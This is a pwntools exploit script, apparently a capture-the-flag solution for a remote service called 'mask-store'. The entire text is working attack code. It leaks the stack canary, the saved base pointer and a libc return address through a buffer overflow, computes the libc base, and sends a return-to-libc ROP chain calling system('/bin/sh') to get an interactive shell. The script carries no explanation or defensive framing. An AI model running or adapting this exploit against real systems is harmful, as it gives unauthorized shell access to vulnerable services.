from pwn import *
#r=process("./mask-store")
#lib=ELF("/lib/x86_64-linux-gnu/libc-2.27.so")
r=remote("211.239.124.243", 18606)
lib=ELF("./libc-2.31.so")
context.log_level='debug'
pay='x'*(0x50-0x8)

r.sendlineafter("? : ","1")
r.sendlineafter(": ","1")

#canary leak
r.sendlineafter("? : ","2")
r.sendlineafter(": ","0")
r.sendlineafter(": ",pay)
r.sendlineafter("? : ","3")
r.recvuntil("x"*(0x50-0x8))
canary=r.recv(8)
canary=b'\x00'+canary[1:]
canary=u64(canary)

#rbp leak
r.sendlineafter("? : ","2")
r.sendlineafter(": ","0")
r.sendlineafter(": ",'x'*0x4f)
r.sendlineafter("? : ","3")
r.recvuntil("x"*0x4f+'\n')
rbp=u64(r.recv(6).ljust(8,b'\x00'))

#ret leak
r.sendlineafter("? : ","2")
r.sendlineafter(": ","0")
r.sendlineafter(": ",'x'*0x57)
r.sendlineafter("? : ","3")
r.recvuntil("x"*0x57+'\n')
ret=u64(r.recv(6).ljust(8,b'\x00'))

#calculate and rop
base=ret-lib.symbols['__libc_start_main']-243
r.sendlineafter("? : ","2")
r.sendlineafter(": ","0")
pay2=b'x'*(0x50-0x8)
pay2+=p64(canary)
pay2+=p64(rbp)
pay2+=p64(base+0x0000000000026b73) 
pay2+=p64(base+0x0000000000026b72)
#ret = 0x26b73, prdi=0x26b72
pay2+=p64(list(lib.search(b'/bin/sh'))[0]+base)
pay2+=p64(base+lib.symbols['system'])

log.info(hex(canary))
log.info(hex(base))
log.info(hex(rbp))

r.sendlineafter(": ",pay2)
r.sendlineafter("? ","4")

r.sendlineafter(": ","1")
r.interactive()
